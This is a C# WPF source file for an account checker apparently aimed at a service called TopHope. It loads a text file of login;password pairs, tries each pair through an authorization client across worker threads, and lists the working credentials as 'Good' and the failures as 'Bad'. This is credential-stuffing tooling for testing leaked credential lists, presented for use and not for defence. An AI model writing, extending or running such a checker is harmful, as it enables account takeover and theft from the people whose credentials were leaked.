using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TopHope.Core;
using System.Windows.Controls;
using TopHope;
using System.Windows;
using System.Windows.Media;
using System.Threading;
using System.Windows.Threading;
using Microsoft.Win32;
using System.IO;

namespace TopHope.Core
{
    class TopHopeCheker
    {
        enum labels
        {
            Source = 0,
            Good,
            Bad,
            Threads
        };
        Label[] labelsArray = new Label[4];
        Grid grid;
        TextBox testBox;
        object locker = new object();

        string[] allLines;
        int accsNum = 0;
        string[] login;
        string[] password;


        int threadsCount;
        static int threadNum = 0;
        static int good = 0;
        static int bad = 0;
        public TopHopeCheker(Grid grid, Label sourceL, Label goodL, Label badL, Label threadsL, TextBox textBox)
        {
            this.grid = grid;
            labelsArray[(int)labels.Source] = sourceL;
            labelsArray[(int)labels.Good] = goodL;
            labelsArray[(int)labels.Bad] = badL;
            labelsArray[(int)labels.Threads] = threadsL;
            this.testBox = textBox;
        }

        public async Task checkStart()
        {
            
            this.threadsCount = 1;
            await Application.Current.Dispatcher.BeginInvoke((new Action(() =>
             {
                 labelsArray[(int)labels.Threads].Content = threadsCount;
             })));
            for (int i = 0; i < threadsCount; i++)
            {
                Task thread = new Task(checkWork);
                thread.Start();
            }


        }

        private void checkWork()
        {
            TopHopeAuth topHopeAuth = new TopHopeAuth();
            topHopeAuth.clientCreate();
            int currentThreadNum = 0;
            lock (locker)
            {
                threadNum++;
                currentThreadNum += threadNum;
            }       
            Thread.Sleep(3000);

            if (accsNum >= currentThreadNum)
            {
                Application.Current.Dispatcher.BeginInvoke((new Action(() =>
                {
                    tryLoginAsync(currentThreadNum,topHopeAuth);
                })));
            }
            else
            {
                Thread.CurrentThread.Abort();
            }

            Thread.Sleep(3000);
            for (int i = 0; i < (accsNum / threadsCount) - 1; i++)
            {
                
                if (accsNum >= currentThreadNum)
                {
                    currentThreadNum += threadsCount;
                    Application.Current.Dispatcher.BeginInvoke((new Action(() =>
                    {
                        tryLoginAsync(currentThreadNum, topHopeAuth);
                    })));
                   
                    
                }
                Thread.Sleep(100);

            }
            if (accsNum % threadsCount != 0 && currentThreadNum + threadsCount <= accsNum)
            {
                for (int i = accsNum - currentThreadNum; i <= accsNum - currentThreadNum; i++)
                {
                    currentThreadNum += threadsCount;

                    Application.Current.Dispatcher.BeginInvoke((new Action(() =>
                    {
                        tryLoginAsync(currentThreadNum, topHopeAuth);
                    })));
                    Thread.Sleep(100);
                    
                }
            }
            Thread.CurrentThread.Abort();


        }

        private async void tryLoginAsync(int currentThtread, TopHopeAuth topHopeAuth)
        {


            bool isTryLogin;
            bool isLoginIn;
            isTryLogin = await topHopeAuth.Authorization(login[currentThtread - 1], password[currentThtread - 1]);
            if (isTryLogin)
            {
                isLoginIn = await topHopeAuth.checkerLogin();
                if (isLoginIn)
                {
                    lock (locker)
                    {
                        good++;
                        labelsArray[(int)labels.Good].Content = good;
                        testBox.Text += login[currentThtread - 1] + password[currentThtread - 1] + "Good" + "\n";
                        
                    }
                    await topHopeAuth.clientCreate();

                }
                else
                {
                    lock (locker)
                    {
                        bad++;
                        labelsArray[(int)labels.Bad].Content = bad;
                        testBox.Text += login[currentThtread - 1] + password[currentThtread - 1] + "Bad" + "\n";
                    }
                }
            }
        }

        public void loadBase()
        {
            string filePatch = null;
            OpenFileDialog fileDialog = new OpenFileDialog();
            fileDialog.Multiselect = false;
            fileDialog.Filter = "TextFiles|*.txt";
            fileDialog.DefaultExt = "*.txt";
            Nullable<bool> dialogOk = false;
            try
            {
                dialogOk = fileDialog.ShowDialog();
                if (dialogOk == true)
                {
                    filePatch = fileDialog.FileName;
                }
                if (filePatch != null)
                {
                    allLines = File.ReadAllLines(filePatch);
                    if(allLines.Length > 0)
                    {
                        labelsArray[(int)labels.Source].Content = allLines.Length;
                        accsNum = allLines.Length;
                        splitBase();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error" + ex.Message);
            }
        }
        
        public void splitBase()
        {
            string[] temp = new string[2];
            login = new string[accsNum];
            password = new string[accsNum];
            for (int i = 0; i < allLines.Length; i++)
            {
                temp = allLines[i].Split(@";".ToCharArray());
                login[i] = temp[0];
                password[i] = temp[1];
            }
        }
    }
}
